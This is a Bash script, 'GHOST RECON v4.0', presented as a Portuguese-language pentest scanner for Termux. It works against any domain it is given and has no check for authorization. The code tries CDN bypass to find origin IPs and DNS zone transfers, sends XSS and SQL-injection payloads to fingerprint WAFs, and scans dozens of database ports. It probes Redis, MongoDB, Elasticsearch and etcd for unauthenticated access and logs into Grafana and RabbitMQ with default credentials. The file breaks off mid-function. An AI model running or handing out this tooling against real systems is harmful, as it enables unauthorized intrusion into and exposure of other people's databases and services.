#!/data/data/com.termux/files/usr/bin/bash

# ================================================================
#   GHOST RECON v4.0 - ULTRA ADVANCED PENTEST SCANNER
#   Termux Edition - Full OSINT + DB + File Vuln + Web Exploit
#
#   Módulos:
#   [1]  Resolução de IPs (IPv4/IPv6/CDN Bypass)
#   [2]  Detecção CDN/WAF
#   [3]  IP Real/Oculto
#   [4]  DNS Completo + Zone Transfer
#   [5]  WHOIS IP + Domínio
#   [6]  GeoIP Multi-IP
#   [7]  HTTP Headers + Tech Fingerprint
#   [8]  SSL/TLS + SANs
#   [9]  Portas DB Expostas (50+ portas)
#   [10] DB Vuln Check + URL de Acesso
#   [11] Painéis Web DB (phpMyAdmin, Adminer...)
#   [12] Default Credentials Tester
#   [13] SQL Injection Scanner
#   [14] ARQUIVO VULN SCANNER (LFI/RFI/Backup/Config/Logs)
#   [15] Directory Brute Force
#   [16] CMS Vulnerability Scan (WordPress/Joomla/Drupal)
#   [17] XSS Scanner
#   [18] Subdomínios (Brute + crt.sh + HackerTarget)
#   [19] Reverse IP
#   [20] Traceroute com GEO
#   [21] Email OSINT (SPF/DMARC/DKIM)
#   [22] JS Files / API Keys Leaked
#   [23] Sensitive Data Exposure
#   [24] CORS Misconfiguration
#   [25] Open Redirect Scanner
#   [26] Relatório Final Completo
# ================================================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
ORANGE='\033[0;33m'
WHITE='\033[1;37m'
BOLD='\033[1m'
BLINK='\033[5m'
BG_RED='\033[41m'
BG_GREEN='\033[42m'
BG_YELLOW='\033[43m'
BG_BLUE='\033[44m'
BG_CYAN='\033[46m'
NC='\033[0m'

DOMAIN=""
MAIN_IP=""
IPV4=""
IPV6=""
FULL_URL=""
LOG_FILE=""
VULN_COUNT=0
OPEN_DB_PORTS=()
ALL_URLS_FOUND=()
declare -A SCAN_RESULTS

# ================================================================
#  BANNER
# ================================================================

banner() {
clear
echo -e "${RED}"
cat << 'BANNER'
  ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗    ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗
 ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝    ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║
 ██║  ███╗███████║██║   ██║███████╗   ██║       ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║
 ██║   ██║██╔══██║██║   ██║╚════██║   ██║       ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║
 ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║       ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║
  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝
BANNER
echo -e "${NC}"
echo -e "${CYAN}┌─────────────────────────────────────────────────────────────────────────┐${NC}"
echo -e "${CYAN}│${NC}  ${WHITE}${BOLD}GHOST RECON v4.0${NC} ${RED}— Ultra Advanced Pentest & OSINT Scanner${NC}              ${CYAN}│${NC}"
echo -e "${CYAN}│${NC}  ${YELLOW}DB Hunter • File Vuln • SQLi • XSS • LFI • RFI • API Leak • Dir Brute${NC}  ${CYAN}│${NC}"
echo -e "${CYAN}│${NC}  ${GREEN}26 Módulos • 200+ Técnicas • Termux Edition${NC}                               ${CYAN}│${NC}"
echo -e "${CYAN}└─────────────────────────────────────────────────────────────────────────┘${NC}"
echo ""
}

# ================================================================
#  HELPERS
# ================================================================

section() {
  echo -e "\n${WHITE}╔══════════════════════════════════════════════════════════════╗${NC}"
  printf "${WHITE}║${NC} ${CYAN}${BOLD}  %-60s${NC}${WHITE}║${NC}\n" "$1"
  echo -e "${WHITE}╚══════════════════════════════════════════════════════════════╝${NC}"
}

log_raw()  { echo "$1" | sed 's/\x1b\[[0-9;]*m//g' >> "$LOG_FILE" 2>/dev/null; }
info()     { echo -e "  ${GREEN}[+]${NC} $1"; log_raw "[+] $1"; }
warn()     { echo -e "  ${YELLOW}[!]${NC} $1"; log_raw "[!] $1"; }
subinfo()  { echo -e "  ${BLUE}  ↳${NC} $1"; log_raw "    > $1"; }
found()    { ((VULN_COUNT++)); echo -e "  ${BG_RED}${WHITE}[★]${NC} ${RED}${BOLD}$1${NC}"; log_raw "[★ VULN] $1"; }
critical() { ((VULN_COUNT++)); echo -e "\n  ${BLINK}${BG_RED}${WHITE} ⚡ CRÍTICO ⚡ ${NC} ${RED}${BOLD}$1${NC}\n"; log_raw "[⚡ CRÍTICO] $1"; }
url_found(){ ALL_URLS_FOUND+=("$1"); echo -e "  ${PURPLE}[🔗]${NC} ${CYAN}$1${NC}"; log_raw "[URL] $1"; }
ok()       { echo -e "  ${BG_GREEN}${WHITE} OK ${NC} $1"; }
progress() { echo -ne "  ${YELLOW}[~]${NC} $1...\r"; }

inc_vuln() { ((VULN_COUNT++)); }

check_deps() {
  section "⚙  DEPENDÊNCIAS"
  PKGS=(curl wget dig whois nmap host traceroute python3 openssl netcat-openbsd git)
  for p in "${PKGS[@]}"; do
    if ! command -v "$p" &>/dev/null; then
      warn "Instalando $p..."
      pkg install "$p" -y &>/dev/null 2>&1 || apt-get install "$p" -y &>/dev/null 2>&1
    else
      ok "$p"
    fi
  done
  pip install requests 2>/dev/null &>/dev/null
}

resolve_target() {
  TARGET="$1"
  DOMAIN=$(echo "$TARGET" | sed 's~https\?://~~;s~www\.~~;s~/.*~~' | tr '[:upper:]' '[:lower:]' | tr -d ' ')
  FULL_URL="https://$DOMAIN"
  LOG_FILE="$HOME/ghostrecon_${DOMAIN}_$(date +%Y%m%d_%H%M%S).log"
  echo "GHOST RECON v4.0 - $DOMAIN - $(date)" > "$LOG_FILE"
  echo "================================================================" >> "$LOG_FILE"

  section "🎯 ALVO: $DOMAIN"
  info "Domínio: ${YELLOW}$DOMAIN${NC}"
  info "URL: ${YELLOW}$FULL_URL${NC}"
  info "Log: ${CYAN}$LOG_FILE${NC}"

  IPV4=$(dig +short "$DOMAIN" A 2>/dev/null)
  IPV6=$(dig +short "$DOMAIN" AAAA 2>/dev/null)
  MAIN_IP=$(echo "$IPV4" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)

  if [ -z "$MAIN_IP" ]; then
    MAIN_IP=$(host "$DOMAIN" 2>/dev/null | grep "has address" | awk '{print $NF}' | head -1)
  fi

  [ -z "$MAIN_IP" ] && echo -e "${RED}[!] Não resolveu o alvo.${NC}" && exit 1

  info "IP Principal: ${RED}$MAIN_IP${NC}"
  echo "$IPV4" | while read ip; do [ -n "$ip" ] && subinfo "IPv4: $ip"; done
  echo "$IPV6" | while read ip; do [ -n "$ip" ] && subinfo "IPv6: $ip"; done
}

# ================================================================
#  [1] CDN/WAF DETECTION
# ================================================================

detect_cdn_waf() {
  section "🛡  [1] CDN / WAF DETECTION"
  HEADERS=$(curl -sI --max-time 10 "$FULL_URL" 2>/dev/null)

  declare -A CDN_SIGS=(
    ["cloudflare"]="CLOUDFLARE"
    ["x-amz\|cloudfront"]="Amazon CloudFront"
    ["fastly"]="Fastly"
    ["akamai\|x-akamai"]="Akamai"
    ["sucuri"]="Sucuri WAF"
    ["incapsula\|imperva\|x-iinfo"]="Imperva Incapsula"
    ["x-cdn\|x-edge"]="Generic CDN"
    ["x-varnish"]="Varnish Cache"
    ["x-cache"]="Cache Server"
    ["x-proxy"]="Proxy Server"
    ["bunnycdn\|bunny"]="BunnyCDN"
    ["stackpath\|highwinds"]="StackPath"
    ["limelight"]="Limelight CDN"
    ["maxcdn\|bootstrapcdn"]="MaxCDN"
  )

  CDN_FOUND=false
  for sig in "${!CDN_SIGS[@]}"; do
    if echo "$HEADERS" | grep -qi "$sig"; then
      found "CDN/WAF: ${CDN_SIGS[$sig]} detectado!"
      CDN_FOUND=true
    fi
  done

  $CDN_FOUND || info "Nenhum CDN/WAF padrão detectado"

  # WAF fingerprint via payload
  for code_test in "403" "406" "501" "999"; do
    WTEST=$(curl -sk --max-time 5 "$FULL_URL/?q=<script>alert(1)</script>&id=1'OR'1'='1" -o /dev/null -w "%{http_code}" 2>/dev/null)
    if [ "$WTEST" = "$code_test" ]; then
      found "WAF ATIVO: Bloqueou payload (HTTP $WTEST)"; break
    fi
  done
}

# ================================================================
#  [2] IP REAL / HIDDEN IP BYPASS
# ================================================================

find_real_ip() {
  section "🔍 [2] IP REAL / BYPASS CDN"

  info "Subdomínios não protegidos pelo CDN..."
  for sub in mail ftp cpanel whm direct smtp pop imap ns1 ns2 ns3 vpn dev dev2 stage staging test beta preview api api2 app apps cdn static old new admin portal remote office; do
    IP_SUB=$(dig +short "$sub.$DOMAIN" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    if [ -n "$IP_SUB" ] && [ "$IP_SUB" != "$MAIN_IP" ]; then
      found "IP diferente: $sub.$DOMAIN → $IP_SUB (possível IP REAL!)"
    fi
  done

  info "SPF Records (pode vazar IP real)..."
  dig +short "$DOMAIN" TXT 2>/dev/null | grep -i "spf\|ip4\|ip6\|include" | while read t; do
    echo "$t" | grep -oE 'ip4:[^ "]+|ip6:[^ "]+' | while read ip; do found "SPF IP leak: $ip"; done
  done

  info "MX Records (email server = IP diferente)..."
  dig +short "$DOMAIN" MX 2>/dev/null | awk '{print $2}' | while read mx; do
    MX_IP=$(dig +short "$mx" A 2>/dev/null | head -1)
    if [ -n "$MX_IP" ] && [ "$MX_IP" != "$MAIN_IP" ]; then
      found "MX IP diferente: $mx → $MX_IP"
    fi
  done

  info "Histórico SSL/crt.sh..."
  CRTS=$(curl -s --max-time 15 "https://crt.sh/?q=%25.$DOMAIN&output=json" 2>/dev/null | \
    python3 -c "
import sys,json
try:
  d=json.load(sys.stdin)
  names=set()
  for e in d:
    for n in e.get('name_value','').split('\n'):
      n=n.strip().replace('*.','')
      if n and '$DOMAIN' in n:
        names.add(n)
  [print(n) for n in sorted(names)[:40]]
except Exception as ex: pass
" 2>/dev/null)

  echo "$CRTS" | while read sub; do
    SUB_IP=$(dig +short "$sub" A 2>/dev/null | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
    [ -n "$SUB_IP" ] && subinfo "crt.sh: $sub → $SUB_IP"
  done

  info "Consultando HackerTarget DNS history..."
  curl -s --max-time 10 "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" 2>/dev/null | \
    grep -v "error\|limit\|API" | head -15 | while read l; do subinfo "HT: $l"; done
}

# ================================================================
#  [3] DNS COMPLETO
# ================================================================

full_dns() {
  section "📡 [3] DNS COMPLETO + ZONE TRANSFER"
  for TYPE in A AAAA MX NS TXT CNAME SOA CAA SRV PTR NAPTR; do
    RES=$(dig +short "$DOMAIN" $TYPE 2>/dev/null)
    if [ -n "$RES" ]; then
      info "${YELLOW}[$TYPE]${NC}"
      echo "$RES" | while read r; do [ -n "$r" ] && subinfo "$r"; done
    fi
  done

  info "Tentando Zone Transfer (AXFR)..."
  dig +short "$DOMAIN" NS 2>/dev/null | while read ns; do
    AXFR=$(dig axfr "$DOMAIN" @"$ns" 2>/dev/null)
    if echo "$AXFR" | grep -qv "failed\|refused\|NOTAUTH\|Transfer"; then
      critical "ZONE TRANSFER possível via $ns!"
      echo "$AXFR" | head -30 | while read l; do subinfo "$l"; done
    fi
  done
}

# ================================================================
#  [4] WHOIS
# ================================================================

whois_info() {
  section "📋 [4] WHOIS COMPLETO"
  info "WHOIS do domínio $DOMAIN:"
  whois "$DOMAIN" 2>/dev/null | grep -iE "registrar|creation|expir|updated|status|name.?server|registrant|admin|tech|abuse|email|country|dnssec" | sort -u | head -25 | while read l; do subinfo "$l"; done

  info "WHOIS do IP $MAIN_IP:"
  whois "$MAIN_IP" 2>/dev/null | grep -iE "netname|country|org|abuse|cidr|address|person|inetnum|route" | sort -u | head -15 | while read l; do subinfo "$l"; done
}

# ================================================================
#  [5] GEOLOCALIZAÇÃO
# ================================================================

geoip_info() {
  section "🗺  [5] GEOLOCALIZAÇÃO DETALHADA"
  for ip in $(echo "$IPV4" | head -4); do
    [ -z "$ip" ] && continue
    GEO=$(curl -s --max-time 8 "http://ip-api.com/json/$ip?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,asname,proxy,hosting,mobile" 2>/dev/null)
    info "GEO para $ip:"
    subinfo "País:    $(echo $GEO | grep -o '"country":"[^"]*"' | cut -d'"' -f4) ($(echo $GEO | grep -o '"countryCode":"[^"]*"' | cut -d'"' -f4))"
    subinfo "Estado:  $(echo $GEO | grep -o '"regionName":"[^"]*"' | cut -d'"' -f4)"
    subinfo "Cidade:  $(echo $GEO | grep -o '"city":"[^"]*"' | cut -d'"' -f4)"
    subinfo "CEP:     $(echo $GEO | grep -o '"zip":"[^"]*"' | cut -d'"' -f4)"
    subinfo "ISP:     $(echo $GEO | grep -o '"isp":"[^"]*"' | cut -d'"' -f4)"
    subinfo "Org:     $(echo $GEO | grep -o '"org":"[^"]*"' | cut -d'"' -f4)"
    subinfo "AS:      $(echo $GEO | grep -o '"as":"[^"]*"' | cut -d'"' -f4)"
    subinfo "TZ:      $(echo $GEO | grep -o '"timezone":"[^"]*"' | cut -d'"' -f4)"
    LAT=$(echo $GEO | grep -o '"lat":[^,}]*' | cut -d: -f2)
    LON=$(echo $GEO | grep -o '"lon":[^,}]*' | cut -d: -f2)
    [ -n "$LAT" ] && info "Maps: ${CYAN}https://maps.google.com/?q=$LAT,$LON${NC}"
    echo "$GEO" | grep -o '"proxy":true' &>/dev/null && found "PROXY/VPN detectado em $ip!"
    echo "$GEO" | grep -o '"hosting":true' &>/dev/null && found "Datacenter/Hosting em $ip!"
    echo ""
  done
}

# ================================================================
#  [6] HTTP HEADERS + TECH FINGERPRINT
# ================================================================

http_tech() {
  section "🌐 [6] HTTP HEADERS + TECNOLOGIAS"
  HEADERS=$(curl -sI --max-time 10 "$FULL_URL" 2>/dev/null)
  echo "$HEADERS" | while read l; do [ -n "$l" ] && subinfo "$l"; done

  info "Tecnologias detectadas:"
  PAGE=$(curl -sk --max-time 15 "$FULL_URL" 2>/dev/null)
  declare -A TECH_SIGS=(
    ["wp-content\|wp-includes\|wordpress"]="CMS: WordPress"
    ["joomla\|/components/com_"]="CMS: Joomla"
    ["drupal\|Drupal.settings"]="CMS: Drupal"
    ["x-powered-by: php"]="Backend: PHP"
    ["x-powered-by: asp.net"]="Backend: ASP.NET"
    ["x-powered-by: express"]="Backend: Node.js/Express"
    ["server: nginx"]="Servidor: NGINX"
    ["server: apache"]="Servidor: Apache"
    ["server: iis"]="Servidor: Microsoft IIS"
    ["server: litespeed"]="Servidor: LiteSpeed"
    ["react\|__react\|ReactDOM"]="Framework: React.js"
    ["angular\|ng-version"]="Framework: Angular"
    ["vue\|__vue__"]="Framework: Vue.js"
    ["jquery"]="Biblioteca: jQuery"
    ["next.js\|__NEXT_DATA__"]="Framework: Next.js"
    ["laravel\|laravel_session"]="Framework: Laravel"
    ["django\|csrfmiddlewaretoken"]="Framework: Django"
    ["rails\|__rails"]="Framework: Ruby on Rails"
    ["magento\|Mage.Cookies"]="Ecommerce: Magento"
    ["shopify\|cdn.shopify"]="Ecommerce: Shopify"
    ["woocommerce\|wc-"]="Ecommerce: WooCommerce"
    ["google-analytics\|gtag\|_ga"]="Analytics: Google Analytics"
    ["googletagmanager\|GTM-"]="Tag Manager: GTM"
    ["hotjar"]="Analytics: Hotjar"
    ["stripe.com/v3"]="Pagamento: Stripe"
    ["paypal"]="Pagamento: PayPal"
    ["mercadopago\|mercado.pago"]="Pagamento: MercadoPago"
    ["recaptcha\|g-recaptcha"]="Proteção: reCAPTCHA"
    ["swagger-ui\|swagger.json\|openapi"]="API Docs: Swagger/OpenAPI"
    ["graphql"]="API: GraphQL"
    ["socket.io"]="RealTime: Socket.IO"
  )

  for sig in "${!TECH_SIGS[@]}"; do
    (echo "$HEADERS" | grep -qi "$sig" || echo "$PAGE" | grep -qi "$sig") && found "${TECH_SIGS[$sig]}"
  done

  info "Security Headers:"
  echo "$HEADERS" | grep -qi "Strict-Transport-Security" && ok "HSTS presente" || warn "HSTS ausente"
  echo "$HEADERS" | grep -qi "X-Frame-Options" && ok "X-Frame-Options presente" || warn "X-Frame-Options ausente (Clickjacking risk)"
  echo "$HEADERS" | grep -qi "X-Content-Type-Options" && ok "X-Content-Type-Options presente" || warn "X-Content-Type-Options ausente"
  echo "$HEADERS" | grep -qi "Content-Security-Policy" && ok "CSP presente" || warn "Content-Security-Policy ausente"
  echo "$HEADERS" | grep -qi "X-XSS-Protection" && ok "XSS Protection presente" || warn "X-XSS-Protection ausente"
  echo "$HEADERS" | grep -qi "Referrer-Policy" && ok "Referrer-Policy presente" || warn "Referrer-Policy ausente"
  echo "$HEADERS" | grep -qi "Permissions-Policy\|Feature-Policy" && ok "Permissions-Policy presente" || warn "Permissions-Policy ausente"
}

# ================================================================
#  [7] SSL/TLS
# ================================================================

ssl_info() {
  section "🔒 [7] SSL/TLS + SANs"
  CERT_DATA=$(echo | timeout 10 openssl s_client -connect "$DOMAIN:443" -servername "$DOMAIN" 2>/dev/null)
  CERT=$(echo "$CERT_DATA" | openssl x509 -noout -text 2>/dev/null)

  if [ -n "$CERT" ]; then
    echo "$CERT_DATA" | openssl x509 -noout -subject -issuer -dates 2>/dev/null | while read l; do subinfo "$l"; done

    SANS=$(echo "$CERT" | grep -A3 "Subject Alternative Name" | grep -oE "DNS:[^,\n]*|IP Address:[^,\n]*")
    if [ -n "$SANS" ]; then
      info "SANs (domínios/IPs no certificado - pode revelar infra):"
      echo "$SANS" | while read s; do subinfo "$s"; done
    fi

    # Weak cipher check
    for proto in ssl2 ssl3 tls1 tls1_1; do
      echo | timeout 4 openssl s_client -connect "$DOMAIN:443" -$proto 2>&1 | grep -qi "handshake\|Cipher" && found "Protocolo inseguro ativo: $proto"
    done
  else
    warn "SSL não disponível ou timeout"
  fi
}

# ================================================================
#  [8] DATABASE PORT SCANNER
# ================================================================

db_port_scanner() {
  section "💀 [8] DATABASE PORT SCANNER"

  declare -A DB_PORTS=(
    [3306]="MySQL/MariaDB"
    [3307]="MySQL Alternativo"
    [33060]="MySQL X Protocol"
    [5432]="PostgreSQL"
    [5433]="PostgreSQL Alternativo"
    [27017]="MongoDB"
    [27018]="MongoDB Secundário"
    [27019]="MongoDB Config"
    [6379]="Redis"
    [6380]="Redis TLS"
    [9200]="Elasticsearch HTTP"
    [9300]="Elasticsearch Transport"
    [5984]="CouchDB"
    [6984]="CouchDB HTTPS"
    [8529]="ArangoDB"
    [7474]="Neo4j HTTP"
    [7687]="Neo4j Bolt"
    [9042]="Cassandra CQL"
    [7000]="Cassandra Internode"
    [2181]="Zookeeper"
    [11211]="Memcached"
    [15672]="RabbitMQ Management"
    [5672]="RabbitMQ AMQP"
    [1433]="MSSQL"
    [1434]="MSSQL Browser"
    [1521]="Oracle DB"
    [50000]="IBM DB2"
    [8086]="InfluxDB"
    [28015]="RethinkDB"
    [29015]="RethinkDB Admin"
    [8983]="Apache Solr"
    [9090]="Prometheus"
    [3000]="Grafana"
    [5601]="Kibana"
    [9600]="Logstash"
    [8123]="ClickHouse HTTP"
    [19000]="ClickHouse TCP"
    [2379]="etcd"
    [2380]="etcd Peer"
    [6432]="PgBouncer"
    [4369]="Erlang/RabbitMQ"
    [8080]="HTTP Alt (DB Panels)"
    [8888]="Jupyter/Admin"
    [4000]="CouchDB Alt"
  )

  info "Testando ${#DB_PORTS[@]} portas de database em $MAIN_IP..."

  for port in $(echo "${!DB_PORTS[@]}" | tr ' ' '\n' | sort -n); do
    SERVICE="${DB_PORTS[$port]}"
    progress "Testando $port ($SERVICE)"
    OPEN=$(timeout 2 bash -c "echo '' > /dev/tcp/$MAIN_IP/$port" 2>/dev/null && echo "OPEN")
    if [ "$OPEN" = "OPEN" ]; then
      OPEN_DB_PORTS+=("$port")
      found "DB EXPOSTO: $port/$SERVICE em $MAIN_IP"
      db_exploit_check "$port" "$SERVICE" "$MAIN_IP"
    fi
  done

  echo -ne "\r\033[K"

  if [ ${#OPEN_DB_PORTS[@]} -eq 0 ]; then
    warn "Portas DB fechadas no IP principal. Tentando nmap..."
    PORTS=$(IFS=,; echo "${!DB_PORTS[*]}")
    NMAP_R=$(nmap -sV --open -T4 -p "$PORTS" "$MAIN_IP" 2>/dev/null)
    echo "$NMAP_R" | grep "open" | while read l; do
      PORT=$(echo "$l" | awk '{print $1}' | cut -d/ -f1)
      SVC=$(echo "$l" | awk '{$1=$2=""; print $0}')
      found "nmap: $PORT/$SVC"
      db_exploit_check "$PORT" "$SVC" "$MAIN_IP"
    done
  fi
}

db_exploit_check() {
  PORT="$1"; SERVICE="$2"; IP="$3"

  case "$PORT" in
    3306|3307|33060)
      critical "MySQL EXPOSTO! → mysql://$IP:$PORT"
      url_found "mysql://$IP:$PORT"
      url_found "http://$DOMAIN/phpmyadmin"
      url_found "http://$DOMAIN/pma"
      url_found "http://$DOMAIN/adminer"
      url_found "http://$IP:8080/phpmyadmin"
      BANNER=$(timeout 3 bash -c "cat < /dev/tcp/$IP/$PORT 2>/dev/null" | strings 2>/dev/null | head -c 200)
      [ -n "$BANNER" ] && found "MySQL Banner: $BANNER"
      ;;
    5432|5433|6432)
      critical "PostgreSQL EXPOSTO! → postgresql://$IP:$PORT"
      url_found "postgresql://$IP:$PORT"
      url_found "http://$IP:5050 (pgAdmin)"
      url_found "http://$DOMAIN/pgadmin4"
      ;;
    27017|27018|27019)
      critical "MongoDB EXPOSTO! Provavelmente SEM AUTH!"
      url_found "mongodb://$IP:$PORT"
      url_found "http://$IP:28017/_status"
      url_found "http://$IP:28017/serverStatus"
      url_found "http://$IP:28017/listDatabases"
      MONGO_HTTP=$(curl -s --max-time 5 "http://$IP:28017/" 2>/dev/null)
      echo "$MONGO_HTTP" | grep -qi "mongo\|listing\|databases" && critical "MongoDB HTTP Interface ABERTA!"
      ;;
    6379|6380)
      critical "Redis EXPOSTO! Testando acesso sem auth..."
      url_found "redis://$IP:$PORT"
      PONG=$(printf "*1\r\n\$4\r\nPING\r\n" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null)
      if echo "$PONG" | grep -qi "PONG\|+OK"; then
        critical "Redis SEM SENHA! Acesso total confirmado!"
        url_found "redis://$IP:$PORT (SEM AUTH — CRÍTICO)"
        INFO=$(printf "*1\r\n\$4\r\nINFO\r\n" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | head -10)
        [ -n "$INFO" ] && subinfo "Redis INFO: $INFO"
        CONF=$(printf "*3\r\n\$6\r\nCONFIG\r\n\$3\r\nGET\r\n\$3\r\ndir\r\n" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | strings)
        [ -n "$CONF" ] && found "Redis CONFIG dir: $CONF"
      fi
      ;;
    9200|9300)
      critical "Elasticsearch EXPOSTO!"
      url_found "http://$IP:9200"
      url_found "http://$IP:9200/_cat/indices?v"
      url_found "http://$IP:9200/_cat/nodes?v"
      url_found "http://$IP:9200/_all/_search?pretty"
      url_found "http://$IP:9200/_cluster/health"
      url_found "http://$IP:9200/_nodes/stats"
      ES=$(curl -s --max-time 5 "http://$IP:9200/" 2>/dev/null)
      echo "$ES" | grep -qi "cluster_name\|version\|elasticsearch" && critical "Elasticsearch SEM AUTH!"
      IDXS=$(curl -s --max-time 5 "http://$IP:9200/_cat/indices?v" 2>/dev/null | head -10)
      [ -n "$IDXS" ] && found "Índices ES: $IDXS"
      ;;
    5984|6984|4000)
      critical "CouchDB EXPOSTO!"
      url_found "http://$IP:$PORT"
      url_found "http://$IP:$PORT/_all_dbs"
      url_found "http://$IP:$PORT/_utils"
      COUCH=$(curl -s --max-time 5 "http://$IP:$PORT/_all_dbs" 2>/dev/null)
      echo "$COUCH" | grep -qi "\[" && critical "CouchDB SEM AUTH! DBs: $COUCH"
      ;;
    11211)
      critical "Memcached EXPOSTO! (Risco DDoS Amplification)"
      STATS=$(echo "stats" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null | head -5)
      [ -n "$STATS" ] && critical "Memcached SEM AUTH: $STATS"
      ;;
    5601)
      critical "Kibana EXPOSTO!"
      url_found "http://$IP:5601"
      url_found "http://$IP:5601/app/kibana"
      url_found "http://$IP:5601/api/status"
      KIB=$(curl -s --max-time 5 "http://$IP:5601/api/status" 2>/dev/null)
      echo "$KIB" | grep -qi "kibana\|version" && critical "Kibana acessível sem auth!"
      ;;
    3000)
      critical "Grafana EXPOSTO!"
      url_found "http://$IP:3000"
      GRAF=$(curl -s --max-time 5 "http://$IP:3000/api/health" 2>/dev/null)
      if echo "$GRAF" | grep -qi "ok"; then
        GRAF_AUTH=$(curl -s --max-time 5 -u "admin:admin" "http://$IP:3000/api/org" 2>/dev/null)
        echo "$GRAF_AUTH" | grep -qi '"id"' && critical "Grafana: admin:admin FUNCIONOU!"
        url_found "http://$IP:3000 (admin:admin)"
      fi
      ;;
    9090)
      critical "Prometheus EXPOSTO!"
      url_found "http://$IP:9090/metrics"
      url_found "http://$IP:9090/api/v1/targets"
      url_found "http://$IP:9090/api/v1/query?query=up"
      PROM=$(curl -s --max-time 5 "http://$IP:9090/-/healthy" 2>/dev/null)
      echo "$PROM" | grep -qi "Healthy\|OK" && critical "Prometheus SEM AUTH! Métricas internas expostas!"
      ;;
    8086|8088)
      critical "InfluxDB EXPOSTO!"
      url_found "http://$IP:$PORT"
      url_found "http://$IP:$PORT/query?q=SHOW+DATABASES"
      CH=$(curl -s --max-time 5 "http://$IP:$PORT/ping" -o /dev/null -w "%{http_code}" 2>/dev/null)
      [ "$CH" = "204" ] && critical "InfluxDB online! Tentando listar DBs..."
      DBS=$(curl -s --max-time 5 "http://$IP:$PORT/query?q=SHOW%20DATABASES" 2>/dev/null)
      [ -n "$DBS" ] && found "InfluxDB databases: $DBS"
      ;;
    8123|19000)
      critical "ClickHouse EXPOSTO!"
      url_found "http://$IP:8123/?query=SHOW+DATABASES"
      url_found "http://$IP:8123/play"
      CH=$(curl -s --max-time 5 "http://$IP:8123/?query=SELECT+1" 2>/dev/null)
      [ "$CH" = "1" ] && critical "ClickHouse SEM AUTH! SELECT executado!"
      ;;
    2379|2380)
      critical "etcd EXPOSTO! Kubernetes secrets em risco!"
      url_found "http://$IP:2379/v3/cluster/member/list"
      url_found "http://$IP:2379/v2/keys/"
      ETCD=$(curl -s --max-time 5 "http://$IP:2379/v3/cluster/member/list" 2>/dev/null)
      echo "$ETCD" | grep -qi "members\|header" && critical "etcd acessível! Kubernetes config exposto!"
      ;;
    2181)
      critical "Zookeeper EXPOSTO!"
      ZK=$(echo "ruok" | timeout 3 nc -w 2 "$IP" "$PORT" 2>/dev/null)
      [ "$ZK" = "imok" ] && critical "Zookeeper responde 'imok' — sem auth!"
      ;;
    15672)
      critical "RabbitMQ Management EXPOSTO!"
      url_found "http://$IP:15672"
      RABBIT=$(curl -s --max-time 5 -u "guest:guest" "http://$IP:15672/api/overview" 2>/dev/null)
      echo "$RABBIT" | grep -qi "rabbitmq_version" && critical "RabbitMQ: guest:guest FUNCIONOU!"
      ;;
    1433|1434)
      critical "Microsoft SQL Server EXPOSTO!"
      url_found "mssql://$IP:$PORT"
      url_found "http://$DOMAIN/reportserver"
      url_found "http://$DOMAIN/reports"
      ;;
    1521)
      critical "Oracle Database EXPOSTO!"
      url_found "oracle://$IP:$PORT"
      ;;
    8983)
      critical "Apache Solr EXPOSTO!"
      url_found "http://$IP:8983/solr"
      url_found "http://$IP:8983/solr/admin/cores?action=STATUS&wt=json"
      SOLR=$(curl -s --max-time 5 "http://$IP:8983/solr/admin/info/system?wt=json" 2>/dev/null)
      echo "$SOLR" | grep -qi "solr_spec_version" && critical "Solr acessível sem auth!"
      ;;
  esac
}

# ================================================================
#  [9] WEB DB PANELS
# ================================================================

web_db_panels() {
  section "🖥  [9] PAINÉIS WEB DE DATABASE"

  PANEL_PATHS=(
    phpmyadmin pma phpma PMA phpmyadmin/ phpmyadmin/index.php
    adminer adminer.php adminer/ db/adminer.php tools/adminer.php
    pgadmin pgadmin4 pgadmin/ pgadmin4/browser
    mongo-express mongoexpress mongodb
    redis-commander rediscommander redis-admin
    kibana kibana/ app/kibana
    grafana grafana/ grafana/login
    phpredisadmin phpPgAdmin phppgadmin
    mysql mysql/ mysqlmanager mysqladmin
    db database db/ database/ dbadmin dbmanager webdb
    admin/phpmyadmin admin/pma control/phpmyadmin
    server/phpmyadmin web/phpmyadmin panel/phpmyadmin
    portal/phpmyadmin tools/phpmyadmin
    phpmyadmin2 pma2 pma1 pma3
    solr solr/ solr/admin
    elasticsearch _plugin/head _cat/indices
    influxdb influxdb/
    rethinkdb cockroachdb
    cassandra-web hue hbase
    jupyter jupyter/ notebook
    superset superset/
    metabase metabase/
  )

  for HOST in "$DOMAIN" "$MAIN_IP"; do
    for proto in http https; do
      for PORT in "" ":8080" ":8888" ":8443" ":9090" ":3000" ":4000"; do
        for path in "${PANEL_PATHS[@]}"; do
          URL="$proto://$HOST$PORT/$path"
          CODE=$(curl -sk --max-time 4 -o /dev/null -w "%{http_code}" "$URL" 2>/dev/null)
          if [[ "$CODE" == "200" || "$CODE" == "301" || "$CODE" == "302" ]]; then
            critical "Painel DB encontrado ($CODE): $URL"
            url_found "$URL"
            test_default_creds_url "$URL"
          elif [ "$CODE" = "401" ] || [ "$CODE" = "403" ]; then
            found "Painel com Auth ($CODE): $URL — Tente credenciais padrão"
            url_found "$URL (auth: $CODE)"
          fi
        done
      done
    done
  done
}

test_default_creds_url() {
  URL="$1"
